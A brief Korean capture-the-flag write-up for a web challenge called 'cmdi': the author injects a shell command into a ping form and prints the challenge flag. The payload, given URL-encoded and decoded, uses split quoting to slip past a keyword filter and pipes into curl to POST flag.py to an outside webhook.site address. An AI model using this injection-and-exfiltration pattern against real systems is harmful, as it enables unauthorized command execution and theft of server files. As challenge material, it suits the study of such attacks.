# cmdi
사이트에 접속하면 Ping을 보낼 수 있는 Page가 나온다.

이 페이지에서 system 함수를 호출하기 때문에 html pattern을 제거하고 curl을 통해 외부 서버로 flag.py를 전송하였다. 

```
127.0.0.1%22+%7C+curl+-X+POST+https%3A%2F%2Fwebhook.site%2Fwebhook-id%2F+-d+%22%24%28c%22a%22t+%22fla%22g.py%29%22+%23

==

127.0.0.1" | curl -X POST https://webhook.site/webhook-id/ -d "$(c"a"t "fla"g.py)" #
```

## Flag
FLAG = 'flag{inject_into_my_heart}'